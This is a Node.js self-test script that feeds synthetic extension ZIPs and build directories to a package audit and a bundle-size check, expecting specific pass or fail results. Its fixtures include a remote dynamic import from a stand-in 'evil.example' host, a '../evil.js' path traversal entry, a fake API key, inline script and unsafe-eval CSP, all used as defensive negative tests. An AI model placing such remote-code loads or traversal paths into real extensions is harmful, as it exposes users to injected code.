#!/usr/bin/env node
// Negative tests for the quality gates: proves audit-zip.mjs and check-bundle-size.mjs
// exit non-zero on each violation and zero on a clean input. Hermetic: builds synthetic
// ZIPs and build directories in the OS temp dir; never touches .output or the repository.
// Usage: node scripts/selftest.mjs
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { randomBytes } from 'node:crypto';
import { deflateRawSync } from 'node:zlib';
import { crc32 } from './lib/zip.mjs';

const scriptsDir = path.dirname(fileURLToPath(import.meta.url));
const expected = JSON.parse(
  readFileSync(path.join(scriptsDir, 'expected-permissions.json'), 'utf8'),
);
const scratch = mkdtempSync(path.join(tmpdir(), 'clavis-selftest-'));

// Built at run time so this file never contains a key-shaped literal (secret scanners).
const fakeKey = ['gsk', 'X7kQ9mZ2vB4nL8cD1fG5hJ3pR6tW0yA'].join('_');

function writeZip(files) {
  const locals = [];
  const central = [];
  let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.isBuffer(content) ? content : Buffer.from(content);
    const packed = deflateRawSync(data);
    const nameBuf = Buffer.from(name);
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(packed.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    const header = Buffer.alloc(46);
    header.writeUInt32LE(0x02014b50, 0);
    header.writeUInt16LE(20, 4);
    header.writeUInt16LE(20, 6);
    header.writeUInt16LE(8, 10);
    header.writeUInt32LE(crc, 16);
    header.writeUInt32LE(packed.length, 20);
    header.writeUInt32LE(data.length, 24);
    header.writeUInt16LE(nameBuf.length, 28);
    header.writeUInt32LE(offset, 42);
    locals.push(local, nameBuf, packed);
    central.push(header, nameBuf);
    offset += local.length + nameBuf.length + packed.length;
  }
  const directory = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, end]);
}

function baseManifest() {
  return {
    manifest_version: 3,
    name: '__MSG_extName__',
    version: '0.1.0',
    default_locale: 'en',
    icons: { 16: 'icon/16.png' },
    permissions: [...expected.permissions],
    host_permissions: [...expected.host_permissions],
    optional_host_permissions: [...expected.optional_host_permissions],
    action: { default_popup: 'popup.html' },
    background: { service_worker: 'background.js' },
  };
}

function baseFiles(manifest = baseManifest()) {
  return {
    'manifest.json': JSON.stringify(manifest),
    'background.js': 'chrome.runtime.onInstalled.addListener(() => {});',
    'popup.html':
      '<!doctype html><html><body><h1>Clavis</h1><script type="module" src="/popup.js"></script></body></html>',
    'popup.js': 'console.warn("ok");',
    'icon/16.png': randomBytes(64),
    '_locales/en/messages.json': '{"extName":{"message":"Clavis"}}',
  };
}

const withManifest = (mutate) => {
  const manifest = baseManifest();
  mutate(manifest);
  return baseFiles(manifest);
};

const zipCases = [
  ['clean package passes', baseFiles(), 0, 'AUDIT PASSED'],
  ['.env file', { ...baseFiles(), '.env': 'X=1' }, 1, 'environment file'],
  ['nested .env.local', { ...baseFiles(), 'config/.env.local': 'X=1' }, 1, 'environment file'],
  ['source map', { ...baseFiles(), 'background.js.map': '{}' }, 1, 'source map'],
  ['pem file', { ...baseFiles(), 'cert.pem': 'x' }, 1, 'key or certificate'],
  ['key file', { ...baseFiles(), 'server.key': 'x' }, 1, 'key or certificate'],
  [
    'Groq key in JS',
    { ...baseFiles(), 'background.js': `const k="${fakeKey}";` },
    1,
    'Groq API key',
  ],
  ['Groq key in JSON', { ...baseFiles(), 'data.json': `{"k":"${fakeKey}"}` }, 1, 'Groq API key'],
  [
    'remote <script src>',
    { ...baseFiles(), 'popup.html': '<script src="https://cdn.example.com/x.js"></script>' },
    1,
    'remote <script',
  ],
  [
    'protocol-relative <script src>',
    { ...baseFiles(), 'popup.html': '<script src="//cdn.example.com/x.js"></script>' },
    1,
    'remote <script',
  ],
  [
    'inline <script>',
    { ...baseFiles(), 'popup.html': '<script>alert(1)</script>' },
    1,
    'inline <script>',
  ],
  [
    'remote import()',
    { ...baseFiles(), 'background.js': 'import("https://evil.example/x.js");' },
    1,
    'remote dynamic import',
  ],
  [
    'dev-server URL in JS',
    { ...baseFiles(), 'background.js': 'new WebSocket("ws://localhost:3000");' },
    1,
    'dev-server URL',
  ],
  [
    'bare localhost in JS only warns',
    { ...baseFiles(), 'popup.js': 'var d="http://localhost";' },
    0,
    'AUDIT PASSED',
  ],
  ['eval in JS only warns', { ...baseFiles(), 'popup.js': 'eval("1");' }, 0, 'eval()'],
  [
    'content_scripts in manifest',
    withManifest((m) => (m.content_scripts = [{ matches: ['<all_urls>'], js: ['c.js'] }])),
    1,
    'content_scripts must be absent',
  ],
  ['extra permission', withManifest((m) => m.permissions.push('tabs')), 1, 'unexpected "tabs"'],
  [
    'extra host permission',
    withManifest((m) => m.host_permissions.push('<all_urls>')),
    1,
    'unexpected "<all_urls>"',
  ],
  ['missing permission', withManifest((m) => m.permissions.pop()), 1, 'is missing'],
  [
    'optional_permissions added',
    withManifest((m) => (m.optional_permissions = ['history'])),
    1,
    'unexpected "history"',
  ],
  [
    'unsafe-eval CSP',
    withManifest(
      (m) => (m.content_security_policy = { extension_pages: "script-src 'self' 'unsafe-eval'" }),
    ),
    1,
    'content_security_policy',
  ],
  [
    'manifest references missing file',
    (() => {
      const f = baseFiles();
      delete f['popup.html'];
      return f;
    })(),
    1,
    'not in the ZIP',
  ],
  ['path traversal entry', { ...baseFiles(), '../evil.js': 'x' }, 1, 'unsafe path'],
];

const results = [];
function record(name, ok, detail) {
  results.push({ name, ok });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok ? '' : `\n      ${detail}`}`);
}

function runNode(script, args) {
  return spawnSync(process.execPath, [path.join(scriptsDir, script), ...args], {
    encoding: 'utf8',
  });
}

zipCases.forEach(([name, files, wantCode, wantText], index) => {
  const file = path.join(scratch, `case-${index}.zip`);
  writeFileSync(file, writeZip(files));
  const run = runNode('audit-zip.mjs', ['--zip', file]);
  const output = `${run.stdout}${run.stderr}`;
  const leaked = output.includes(fakeKey);
  const ok = run.status === wantCode && output.includes(wantText) && !leaked;
  record(
    `audit-zip: ${name}`,
    ok,
    `exit ${run.status} (want ${wantCode}), text "${wantText}" ${output.includes(wantText) ? 'found' : 'missing'}${leaked ? ', SECRET LEAKED IN OUTPUT' : ''}`,
  );
});

// --strict turns warnings into failures.
{
  const file = path.join(scratch, 'strict.zip');
  writeFileSync(file, writeZip({ ...baseFiles(), 'popup.js': 'eval("1");' }));
  const run = runNode('audit-zip.mjs', ['--zip', file, '--strict']);
  record('audit-zip: --strict fails on warnings', run.status === 1, `exit ${run.status}`);
}

// Bundle-size cases against a synthetic budgets file and build directory.
function sizeCase(name, files, wantCode, wantText) {
  const dir = mkdtempSync(path.join(scratch, 'build-'));
  for (const [rel, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    writeFileSync(path.join(dir, rel), content);
  }
  const budgets = path.join(scratch, 'budgets.json');
  writeFileSync(
    budgets,
    JSON.stringify({
      buildDir: dir,
      budgets: [
        {
          id: 'observer',
          files: ['content-scripts/content.js'],
          maxGzipBytes: 15360,
          required: true,
        },
        {
          id: 'lazy',
          files: ['content-scripts/content-ui*.js', 'content-scripts/content-ui*.css'],
          maxGzipBytes: 61440,
          required: false,
          aggregate: true,
        },
      ],
    }),
  );
  const run = runNode('check-bundle-size.mjs', ['--dir', dir, '--budgets', budgets]);
  const output = `${run.stdout}${run.stderr}`;
  record(
    `check-bundle-size: ${name}`,
    run.status === wantCode && output.includes(wantText),
    `exit ${run.status} (want ${wantCode}), output:\n${output}`,
  );
}
sizeCase(
  'small observer passes, lazy UI skipped',
  { 'content-scripts/content.js': 'console.warn(1);' },
  0,
  'skipped (absent)',
);
sizeCase(
  'observer over 15 KB gzip fails',
  { 'content-scripts/content.js': randomBytes(16 * 1024).toString('hex') },
  1,
  'OVER BUDGET',
);
sizeCase('required content script missing fails', { 'background.js': 'x' }, 1, 'MISSING');
sizeCase(
  'lazy UI over 60 KB gzip fails',
  {
    'content-scripts/content.js': 'x',
    'content-scripts/content-ui.js': randomBytes(62 * 1024).toString('base64'),
  },
  1,
  'content-ui.js',
);
sizeCase(
  'lazy UI within budget passes',
  { 'content-scripts/content.js': 'x', 'content-scripts/content-ui.js': 'y'.repeat(2000) },
  0,
  'all content-script budgets hold',
);
{
  const run = runNode('check-bundle-size.mjs', ['--dir', path.join(scratch, 'does-not-exist')]);
  record('check-bundle-size: missing build dir fails', run.status !== 0, `exit ${run.status}`);
}

rmSync(scratch, { recursive: true, force: true });
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} negative tests behaved as expected.`);
process.exitCode = failed === 0 ? 0 : 1;
